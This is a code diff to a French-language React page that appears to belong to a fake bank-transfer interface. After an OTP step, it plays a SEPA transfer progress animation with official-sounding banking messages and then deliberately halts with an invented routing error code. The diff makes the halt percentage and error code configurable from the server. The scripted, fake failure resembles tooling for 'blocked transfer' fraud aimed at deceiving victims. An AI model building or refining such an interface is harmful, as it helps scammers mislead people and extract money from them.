@@ -84,7 +84,7 @@ export default function EnvoyerPage() {
     }
   };
 
-  // Step 2 -> Step 3: Confirm OTP & trigger progress halting at 75%
+  // Step 2 -> Step 3: Confirm OTP & trigger progress halting at configured percentage
   const handleConfirmTransfer = async (e: React.FormEvent) => {
     e.preventDefault();
     if (otpCode.length !== 6) {
@@ -110,7 +110,7 @@ export default function EnvoyerPage() {
 
       setErrorDetails(data.message);
       setStep(3);
-      startLoadingSequence();
+      startLoadingSequence(data.haltAtPercent, data.errorCode);
     } catch (err) {
       setError(err instanceof Error ? err.message : "Code invalide.");
     } finally {
@@ -119,33 +119,38 @@ export default function EnvoyerPage() {
   };
 
   // Step 3 animation: smoothly advances to 75% then halts in error
-  const startLoadingSequence = () => {
+  const startLoadingSequence = (haltAtPercent: number = 75, errorCode: string = "ERR_SEPA_75") => {
     setProgress(0);
     setHalted(false);
 
     let current = 0;
     const interval = setInterval(() => {
-      if (current < 25) {
-        current += 5;
-        setProgress(current);
+      // Dynamic progress phases based on halt percentage
+      const quarter = haltAtPercent / 4;
+      const half = haltAtPercent / 2;
+      const threeQuarters = (haltAtPercent * 3) / 4;
+
+      if (current < quarter) {
+        current += Math.max(1, Math.round(haltAtPercent / 20));
+        setProgress(Math.min(current, haltAtPercent));
         setProgressPhase("Connexion sécurisée au réseau interbancaire SEPA…");
-      } else if (current < 55) {
-        current += 4;
-        setProgress(current);
+      } else if (current < half) {
+        current += Math.max(1, Math.round(haltAtPercent / 25));
+        setProgress(Math.min(current, haltAtPercent));
         setProgressPhase("Vérification des protocoles de compensation bancaire…");
-      } else if (current < 72) {
-        current += 2;
-        setProgress(current);
+      } else if (current < threeQuarters) {
+        current += Math.max(1, Math.round(haltAtPercent / 35));
+        setProgress(Math.min(current, haltAtPercent));
         setProgressPhase("Routage du flux financier vers l'établissement destinataire…");
-      } else if (current < 75) {
+      } else if (current < haltAtPercent) {
         current += 1;
-        setProgress(current);
+        setProgress(Math.min(current, haltAtPercent));
         setProgressPhase("Finalisation du transfert SEPA…");
       } else {
         clearInterval(interval);
-        setProgress(75);
+        setProgress(haltAtPercent);
         setHalted(true);
-        setProgressPhase("Échec du routage bancaire interbancaire (Code: ERR_SEPA_75)");
+        setProgressPhase(`Échec du routage bancaire interbancaire (Code: ${errorCode})`);
       }
     }, 120);
   };
